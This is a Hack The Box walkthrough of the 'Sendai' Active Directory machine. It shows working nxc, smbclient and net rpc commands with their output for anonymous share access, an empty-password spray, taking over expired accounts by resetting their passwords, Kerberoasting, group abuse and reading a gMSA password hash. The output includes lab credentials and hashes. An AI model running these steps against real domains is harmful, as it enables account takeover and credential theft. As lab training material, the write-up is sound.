---
title: Sendai
summary: Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Password spray leads to user compromise, Kerberoasting.
date: 2026-04-06
tags: [Hack The Box, Active Directory, Windows]
difficulty: medium
os: Windows
url: https://app.hackthebox.com/machines/Sendai
author: Ethan Bauer
author_url: https://github.com/ethanbauer10
source: https://github.com/ethanbauer10/Obsidian/blob/main/HackTheBox/Sendai%20%5BAD%5D/Sendai%20%5BAD%5D.md
---

# Sendai
## Host file Setup
```python
sudo nxc smb 10.129.234.66 --generate-hosts-file /etc/hosts                         
[sudo] password for kali: 
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
```
This setup my hosts file for me now ill start with enumeration
## Enumeration
### Open ports
```python
nmap -p- --min-rate=3000 10.129.234.66        
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-03 14:53 +0000
Nmap scan report for 10.129.234.66
Host is up (0.013s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
50946/tcp open  unknown
58240/tcp open  unknown
58241/tcp open  unknown
58256/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 44.50 seconds
```
### Nmap
```python
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 -A --min-rate=3000 10.129.234.66
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-03 14:55 +0000
Nmap scan report for DC.sendai.vl (10.129.234.66)
Host is up (0.014s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus

88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-03 14:56:03Z)

135/tcp  open  msrpc         Microsoft Windows RPC

139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn

389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05

445/tcp  open  microsoft-ds?

464/tcp  open  kpasswd5?

593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0

636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05

3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
|_ssl-date: TLS randomness does not represent time

3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
|_ssl-date: TLS randomness does not represent time

3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SENDAI
|   NetBIOS_Domain_Name: SENDAI
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: sendai.vl
|   DNS_Computer_Name: dc.sendai.vl
|   DNS_Tree_Name: sendai.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-03T14:56:47+00:00
|_ssl-date: 2026-03-03T14:57:27+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=dc.sendai.vl
| Not valid before: 2026-03-02T14:52:53
|_Not valid after:  2026-09-01T14:52:53

5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

9389/tcp open  mc-nmf        .NET Message Framing

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
The DC is running on the same time as me so i wont have to sync the time
I already have the DC name and the domain name from my nxc command earlier
## SMB (445)
### Anonymous logon
```python
smbclient -L \\\\DC.sendai.vl\\                               
Password for [WORKGROUP\kali]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	config          Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	sendai          Disk      company share
	SYSVOL          Disk      Logon server share 
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to DC.sendai.vl failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Looks like anonymous logon was successful and i can list shares
There are some non-default shares, `config` `sendai` and `Users`
The others are default, but it still might be worth running Get-GPPPassword.py on this to find group policy passwords
No luck on group policy passwords
### Access to shares as guest/anonymous
```python
nxc smb DC.sendai.vl -u Guest -p '' --shares
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Guest: 
SMB         10.129.234.66   445    DC               [*] Enumerated shares
SMB         10.129.234.66   445    DC               Share           Permissions     Remark
SMB         10.129.234.66   445    DC               -----           -----------     ------
SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.66   445    DC               C$                              Default share
SMB         10.129.234.66   445    DC               config                          
SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.66   445    DC               NETLOGON                        Logon server share 
SMB         10.129.234.66   445    DC               sendai          READ            company share
SMB         10.129.234.66   445    DC               SYSVOL                          Logon server share 
SMB         10.129.234.66   445    DC               Users           READ
```
### Access to `sendai` share
```python
smbclient \\\\DC.sendai.vl\\sendai
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 18 18:31:04 2023
  ..                                DHS        0  Wed Apr 16 03:55:42 2025
  hr                                  D        0  Tue Jul 11 13:58:19 2023
  incident.txt                        A     1372  Tue Jul 18 18:34:15 2023
  it                                  D        0  Tue Jul 18 14:16:46 2023
  legal                               D        0  Tue Jul 11 13:58:23 2023
  security                            D        0  Tue Jul 18 14:17:35 2023
  transfer                            D        0  Tue Jul 11 14:00:20 2023

		7019007 blocks of size 4096. 899700 blocks available
smb: \> 
```
I have access to this share, i could not list anything in the config share
I also have access to the `Users` share but there isnt anything interesting there
The transfer directory has a list of empty directories that look like they belong to users
The hr directory is empty
The security directory has a guidelines text file which doesnt have anything interesting

```python
smb: \it\> ls
  .                                   D        0  Tue Jul 18 14:16:46 2023
  ..                                  D        0  Tue Jul 18 18:31:04 2023
  Bginfo64.exe                        A  2774440  Tue Jul 18 14:16:43 2023
  PsExec64.exe                        A   833472  Tue Jul 18 14:16:38 2023

		7019007 blocks of size 4096. 1237984 blocks available
smb: \it\> 

```
Found some interesting .exe files in the `it` share

#### `incident.txt` file from `sendai` share
```python
cat incident.txt 
Dear valued employees,

We hope this message finds you well. We would like to inform you about an important security update regarding user account passwords. Recently, we conducted a thorough penetration test, which revealed that a significant number of user accounts have weak and insecure passwords.

To address this concern and maintain the highest level of security within our organization, the IT department has taken immediate action. All user accounts with insecure passwords have been expired as a precautionary measure. This means that affected users will be required to change their passwords upon their next login.

We kindly request all impacted users to follow the password reset process promptly to ensure the security and integrity of our systems. Please bear in mind that strong passwords play a crucial role in safeguarding sensitive information and protecting our network from potential threats.

If you need assistance or have any questions regarding the password reset procedure, please don't hesitate to reach out to the IT support team. They will be more than happy to guide you through the process and provide any necessary support.

Thank you for your cooperation and commitment to maintaining a secure environment for all of us. Your vigilance and adherence to robust security practices contribute significantly to our collective safety.
```
So this note explains the newest update for passwords on accounts
### Users on the domain
```python
nxc smb DC.sendai.vl -u 'Guest' -p '' --rid-brute
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Guest: 
SMB         10.129.234.66   445    DC               498: SENDAI\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.66   445    DC               500: SENDAI\Administrator (SidTypeUser)
SMB         10.129.234.66   445    DC               501: SENDAI\Guest (SidTypeUser)
SMB         10.129.234.66   445    DC               502: SENDAI\krbtgt (SidTypeUser)
SMB         10.129.234.66   445    DC               512: SENDAI\Domain Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               513: SENDAI\Domain Users (SidTypeGroup)
SMB         10.129.234.66   445    DC               514: SENDAI\Domain Guests (SidTypeGroup)
SMB         10.129.234.66   445    DC               515: SENDAI\Domain Computers (SidTypeGroup)
SMB         10.129.234.66   445    DC               516: SENDAI\Domain Controllers (SidTypeGroup)
SMB         10.129.234.66   445    DC               517: SENDAI\Cert Publishers (SidTypeAlias)
SMB         10.129.234.66   445    DC               518: SENDAI\Schema Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               519: SENDAI\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               520: SENDAI\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.66   445    DC               521: SENDAI\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.66   445    DC               522: SENDAI\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.66   445    DC               525: SENDAI\Protected Users (SidTypeGroup)
SMB         10.129.234.66   445    DC               526: SENDAI\Key Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               527: SENDAI\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               553: SENDAI\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.66   445    DC               571: SENDAI\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.66   445    DC               572: SENDAI\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.66   445    DC               1000: SENDAI\DC$ (SidTypeUser)
SMB         10.129.234.66   445    DC               1101: SENDAI\DnsAdmins (SidTypeAlias)
SMB         10.129.234.66   445    DC               1102: SENDAI\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.66   445    DC               1103: SENDAI\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)
SMB         10.129.234.66   445    DC               1104: SENDAI\sqlsvc (SidTypeUser)
SMB         10.129.234.66   445    DC               1105: SENDAI\websvc (SidTypeUser)
SMB         10.129.234.66   445    DC               1107: SENDAI\staff (SidTypeGroup)
SMB         10.129.234.66   445    DC               1108: SENDAI\Dorothy.Jones (SidTypeUser)
SMB         10.129.234.66   445    DC               1109: SENDAI\Kerry.Robinson (SidTypeUser)
SMB         10.129.234.66   445    DC               1110: SENDAI\Naomi.Gardner (SidTypeUser)
SMB         10.129.234.66   445    DC               1111: SENDAI\Anthony.Smith (SidTypeUser)
SMB         10.129.234.66   445    DC               1112: SENDAI\Susan.Harper (SidTypeUser)
SMB         10.129.234.66   445    DC               1113: SENDAI\Stephen.Simpson (SidTypeUser)
SMB         10.129.234.66   445    DC               1114: SENDAI\Marie.Gallagher (SidTypeUser)
SMB         10.129.234.66   445    DC               1115: SENDAI\Kathleen.Kelly (SidTypeUser)
SMB         10.129.234.66   445    DC               1116: SENDAI\Norman.Baxter (SidTypeUser)
SMB         10.129.234.66   445    DC               1117: SENDAI\Jason.Brady (SidTypeUser)
SMB         10.129.234.66   445    DC               1118: SENDAI\Elliot.Yates (SidTypeUser)
SMB         10.129.234.66   445    DC               1119: SENDAI\Malcolm.Smith (SidTypeUser)
SMB         10.129.234.66   445    DC               1120: SENDAI\Lisa.Williams (SidTypeUser)
SMB         10.129.234.66   445    DC               1121: SENDAI\Ross.Sullivan (SidTypeUser)
SMB         10.129.234.66   445    DC               1122: SENDAI\Clifford.Davey (SidTypeUser)
SMB         10.129.234.66   445    DC               1123: SENDAI\Declan.Jenkins (SidTypeUser)
SMB         10.129.234.66   445    DC               1124: SENDAI\Lawrence.Grant (SidTypeUser)
SMB         10.129.234.66   445    DC               1125: SENDAI\Leslie.Johnson (SidTypeUser)
SMB         10.129.234.66   445    DC               1126: SENDAI\Megan.Edwards (SidTypeUser)
SMB         10.129.234.66   445    DC               1127: SENDAI\Thomas.Powell (SidTypeUser)
SMB         10.129.234.66   445    DC               1128: SENDAI\ca-operators (SidTypeGroup)
SMB         10.129.234.66   445    DC               1129: SENDAI\admsvc (SidTypeGroup)
SMB         10.129.234.66   445    DC               1130: SENDAI\mgtsvc$ (SidTypeUser)
SMB         10.129.234.66   445    DC               1131: SENDAI\support (SidTypeGroup)
```
Using the `cut` command ive put this into a users file
I used this list to try some as-rep roasting, however this failed
## Password spray leads to user compromise
```python
nxc smb DC.sendai.vl -u users.txt -p '' --continue-on-success
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [-] sendai.vl\Administrator: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\Guest: 
SMB         10.129.234.66   445    DC               [-] sendai.vl\krbtgt: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\DC$: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\sqlsvc: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\websvc: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Dorothy.Jones: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Kerry.Robinson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Naomi.Gardner: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Anthony.Smith: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Susan.Harper: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Stephen.Simpson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Marie.Gallagher: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Kathleen.Kelly: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Norman.Baxter: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Jason.Brady: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE
SMB         10.129.234.66   445    DC               [-] sendai.vl\Malcolm.Smith: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Lisa.Williams: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Ross.Sullivan: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Clifford.Davey: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Declan.Jenkins: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Lawrence.Grant: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Leslie.Johnson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Megan.Edwards: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\mgtsvc$: STATUS_LOGON_FAILURE
```
The users `elliot.yates` and `thomas.powell` are open to compromise via a password change
### Compromising `elliot.yates` and `thomas.powell`
```python
nxc smb DC.sendai.vl -u elliot.yates -p '' -M change-password -o NEWPASS=Ethan-hacked-you69
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [-] sendai.vl\elliot.yates: STATUS_PASSWORD_MUST_CHANGE 
CHANGE-P... 10.129.234.66   445    DC               [+] Successfully changed password for elliot.yates
```
This changed the password of `elliot.yates`

```python
nxc smb DC.sendai.vl -u thomas.powell -p '' -M change-password -o NEWPASS=Ethan-hacked-you69
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [-] sendai.vl\thomas.powell: STATUS_PASSWORD_MUST_CHANGE 
CHANGE-P... 10.129.234.66   445    DC               [+] Successfully changed password for thomas.powell
```
Now both passwords are changed i can check my access over SMB
And also try some kerberoasting
## Kerberoasting
So now i have creds i can try some kerberoasting
```python
nxc ldap DC.sendai.vl -u elliot.yates -p 'Ethan-hacked-you69' --kerberoasting kerb.hash
LDAP        10.129.234.66   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (signing:None) (channel binding:Never) 
LDAP        10.129.234.66   389    DC               [+] sendai.vl\elliot.yates:Ethan-hacked-you69 
LDAP        10.129.234.66   389    DC               [*] Skipping disabled account: krbtgt
LDAP        10.129.234.66   389    DC               [*] Total of records returned 2
LDAP        10.129.234.66   389    DC               [*] sAMAccountName: mgtsvc$, memberOf: CN=Remote Management Users,CN=Builtin,DC=sendai,DC=vl, pwdLastSet: 2023-07-11 14:06:05.143133, lastLogon: <never>
LDAP        10.129.234.66   389    DC               $krb5tgs$18$hostmgtsvc.sendai.vl$SENDAI.VL$*sendai.vl\mgtsvc$*$3847cf7f30c6137de22ef772$8394a1aeee95206c84d8e5448e5193294b71349c6cdd84b26beed51be11b76a3c97057f94da337161ea8bd8bee5bbcf14ced870237f9de9f7c821ada9a60d7d39c79d7d2916c93b3af517fee78ecfda2ca03ef81c311ef027a31ec77dffbaa4b51025926556c1b1a871044984993e8c07cdcaa6e50df8ea8c0cf23625a94f295d2ffbb67e0f62270d6eeafd6ac3a588a45da0f3592f1bf10d5db4c5b98fe7c54fae76a30fc67a67e93e057339d78a9c455e5240230ab7962cb95fd29d496239a630ed489f75e6dc53aa1e7a94ec789c2798a22caa6afcaff434e4d43040bbf1daf4eac5e15a4ddeb5a8db55a08d49a93040e15907820a52c13e92addad8e89620eabc8469c8c55c944bd4d5e7ee78bce387d82b85d9fb888ccb88059e012038319714def91b1de93652e2161f00decc85a881349cdc26a416e322cff815e510f1e7338947c744b3f0393cc8299c11520444e91daf3df749f6a8ec3ea61d63f23f0de276cae41a4f26b1a6df224c103c731b44a566ad78922dc9e3db5c3ca5c1538e3f4982cfb48c263ee018112ce4ad1789b89863d73f371afcb580fdce92453b13cde2bff64a4d536780ec730f866477e32b9c508341f80ffaea213c0d80a71a7d51e0dad3efc523a58aa87096bc00c52bcb4b2552864156278b9f52395695e8c3c0a206653d85a90403671426bba83212f725785f00b04f9f6d1e968c942c7e7beaab2500c07e903adeda38418d2d76366068fae02812a2c398ee04d0f30ca5e01c3d2628404a246cd4d084b1d03a7aeac5e651beb02ddf4cc31c6b4208b52e7cee7d68bc8bdd6d4aed3f7d43823d6407df844e8652dbce890a1887e5665724ee594d9cc70df9fbbd1896fc6f22bb0f3c9c6c501e79749d49b79d1a174edf7570208d689f21e3ed76e3b1c4612378497fef263676a9cce00f8f8dda3e98ff5258989736d12ea91ea7389d916f28e05133c36bcbb397737e18255d354c0f94ae3271360622622e1563486c450c4449ef0f7478e12172748cafbda69d12f6a2d0ee62bacc9539b6c91a683cb3a9bad9233cfcd9aa7cd3c4d40ae2d80706d01d07d850a6599daaeb112925fbb1b92c9bc8f1b383678259c6b152e2875c44cb3e6988ed828cdfb10e4dcee12a156630bb6c083d89683a08ece1c4ad1f6fd3a74a86bbd130c6687e91f9463b9ad33c8a7d2a8c2d2c1edc440b4d68abe062b701bacdcca3a0c683645c26abcc5d5d3071ffe92fec5d36ca678110fa9db452792b99ba89d27346259d42961fdff65f3327aec7c3eccb610383e8173bdccfc79dad5e926c96d342695430516d1e58d19734f9ea568f6dfc87a7ee2914ad9b6576d2f2b634c13c0db968f5e583d42dfae05b78f28be0c320a636925c34364017c7ce1090561a790f44a7a799eb6f404ddddd070702970063b5d883420f5880d05de07145a605730bc0bde52762e8934f9d7e307f9f2ac19aba11b4208b92274e490beac2b4953fde621cfc7bb5ba91fbe88f692db379c21cf87b47659e732b61acac1dc031501f65977
LDAP        10.129.234.66   389    DC               [*] sAMAccountName: sqlsvc, memberOf: [], pwdLastSet: 2023-07-11 10:51:18.413329, lastLogon: 2026-03-03 14:55:26.842948
LDAP        10.129.234.66   389    DC               $krb5tgs$23$*sqlsvc$SENDAI.VL$sendai.vl\sqlsvc*$e6b027eeb28502408b076c9b9ead9d04$f7b3d84dbd3ae2459858ec9fa38db9c7ef79b43280261d9632e677e0230990794de3861060123aad944ea08bd6b51872fda71a2c008229da6bb8047f31e6370a86c4bb0fa6d9418046894b247ed2d851b08192d81aefa37880c6bf6b7244b3f9c4f8752e4661588c9770d956389071308980ec3fc7a0c55bbf4b6e7d9613650b62cd295526affb4e8f37192b74b17c0f51e424814726a721b255fca41f2a127a7fd8c88a61e458f231fae89f7eb30cda5108650815c71655b46ced8e4bf4782e9b4127c58926f6f45517d7438bcd95e491eedc885266691ad89226f6715f01504d86f7c8ee4f61cf711b30368d37ff1867e5cfa67c92206a6b79857524c5b8a507b566ad6905a3b2c7bd6bd20f9d5e6cebca2977516e1c38892858040656fb787a344cb3739db200736ea409d5e31686792c450ea56f2faacc624b97b48e066d70b3da4c5091913e71c41fad3dd482489259c2bc035cae6d83da9f985a966f86a23f98a0432a7d307616c91dffecb2b2e6b139bbfb0fddd023925f95cee8a5f689ef4181c5f9755d2108c475a6491f26844729f634b9497d0f197deae8af9caf1d17116510ac827b8922fa8a536caacbbd06d8fe32bf91a8f86557b443cfab401bc3cc7b3a745827c77d17725347de566f97753f5fd06ecf7f849b86f05588344d01a0795a81640fd0b980abe9f330f2d045c3fdee4b8f9e1a67b377caecf3a86267365206e2523513e918bd31881be99a7e6047aba0933dc2d27a0ef27f8106c6baaa2c3425e878573488fad01cdf0dd008bc94158b08136a3cf160441ad6a5ab6b7c3276dda5a689e1a553a18aa9f8517b77098f8df31a97705e004b6892774523e7269d344a609a5f05bf8b4d19646291171212f3b01a82cdeb1d12400c8efe51da469e4c6dffd79b00a8e936df0525bb06b3169edc95f41e2e57085e35bd3eceba60d8e390cb748dd48491a959df732a98fc8a9b063d14b65e1da89339927dc9a1309c037b5600b592daeff940c954b94348f1bc211c2787d60c5fbc9e8fa019341e7e79809dd47d419994043a9499e17ef25e2566599c87ee579ac1440ca69b0f706e512193fd965050d584b36873859d30d84811f1eb224fd489b8ea897f16ad1d0941330130cf2a3855126cfa328cfd7e4d59540e83e0c20ef61449f9ffd11f84bf2363ca8095100864910b98753014b37bd9eea8e3c91cd856fd9d050a80ba7d87d013d6029bc5b14ef7ae2e7775d4b2464bd49d8686fbb96b814603c40a3d6f20bb20e934c3bf915f96d5bc94d9a621685cd2acd2e313a0cdadb64467f83b9954efb015f2516dc8d0a609b8963e5ca0341817ef1a88e09b1b9af21e662d550a9e16a42ac22ac46fc83005f3372361d095505108dfc1d6b2d2ced20c6c8b72c24ba0ec1b3e6c09bae36dc693c1f5f7c0296c1deb2053ca61ef22711c0d6cefb71cf8d2e122f950203beb8deccb98db1317a423d136feec2aefd771b9808c7c8ec4d489186441c1c92c882daad16e665db91d169aac2545bbcfe6b9d62f40f8c54d60
```
Looks like ive found some hashes, lets try to crack them
### Cracking the hashes
So neither one of the hashes cracked, so ill revisit the access i have with the two compromised users
## Access to SMB shares with compromised accounts
```python
nxc smb DC.sendai.vl -u elliot.yates -p 'Ethan-hacked-you69' --shares
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\elliot.yates:Ethan-hacked-you69 
SMB         10.129.234.66   445    DC               [*] Enumerated shares
SMB         10.129.234.66   445    DC               Share           Permissions     Remark
SMB         10.129.234.66   445    DC               -----           -----------     ------
SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.66   445    DC               C$                              Default share
SMB         10.129.234.66   445    DC               config          READ,WRITE      
SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.66   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.66   445    DC               sendai          READ,WRITE      company share
SMB         10.129.234.66   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.234.66   445    DC               Users           READ
```
Elliot has high access on these shares

```python
nxc smb DC.sendai.vl -u thomas.powell -p 'Ethan-hacked-you69' --shares
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\thomas.powell:Ethan-hacked-you69 
SMB         10.129.234.66   445    DC               [*] Enumerated shares
SMB         10.129.234.66   445    DC               Share           Permissions     Remark
SMB         10.129.234.66   445    DC               -----           -----------     ------
SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.66   445    DC               C$                              Default share
SMB         10.129.234.66   445    DC               config          READ,WRITE      
SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.66   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.66   445    DC               sendai          READ,WRITE      company share
SMB         10.129.234.66   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.234.66   445    DC               Users           READ
```
Thomas also has the same access
### `config` share
```python
smbclient \\\\DC.sendai.vl\\config -U 'elliot.yates'%'Ethan-hacked-you69'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Mar  3 15:40:01 2026
  ..                                DHS        0  Wed Apr 16 03:55:42 2025
  .sqlconfig                          A       78  Tue Jul 11 13:57:11 2023

		7019007 blocks of size 4096. 1236365 blocks available
smb: \> get .sqlconfig 
getting file \.sqlconfig of size 78 as .sqlconfig (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec)
smb: \> 
```
Found a sql config file
I also have write access on this share so it might be worth running a watering hole attack on both shares i have write access on

```python
cat .sqlconfig                      
Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=SurenessBlob85;
```
Found a password its worth running a password spray on this, even though im pretty sure its for the sql service account
So this password is for the sql service account, but since there are no SQL services open externally i cant do a lot with this right now
## Bloodhound
![Screenshot](images/sendai/pasted-image-20260406002602.webp)
So the user `elliot.yates` has GenericAll on `admsvc` OU and also the `admsvc` group
`Thomas.powell` also has the same access, so it does not matter which user i use
Its also worth noting that the `admsvc` group has readGMSApassword on the account `mgtsvc$`
## Compromising `mgtsvc`
The first step is to add one of the compromised users to the `admsvc` group, i can then read the GMSA password of `mgtsvc`

```python
net rpc group addmem "admsvc" "elliot.yates" -U "sendai.vl"/"elliot.yates"%'Ethan-hacked-you69' -S "DC.sendai.vl"
```
This added the user to the group

```python
nxc ldap DC.sendai.vl -u elliot.yates -p 'Ethan-hacked-you69' --gmsa                                        
LDAP        10.129.234.66   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (signing:None) (channel binding:Never) 
LDAP        10.129.234.66   389    DC               [+] sendai.vl\elliot.yates:Ethan-hacked-you69 
LDAP        10.129.234.66   389    DC               [*] Getting GMSA Passwords
LDAP        10.129.234.66   389    DC               Account: mgtsvc$              NTLM: 1cee4a65ef4459e44eb0031cc640ba18     PrincipalsAllowedToReadPassword: admsvc
```
Now i have the NTLM hash of the user `mgtsvc`
I can now use this to look at their access
So this user does not have any extra access on SMB

```python
nxc winrm DC.sendai.vl -u mgtsvc$ -H '1cee4a65ef4459e44eb0031cc640ba18'     
WINRM       10.129.234.66   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) 
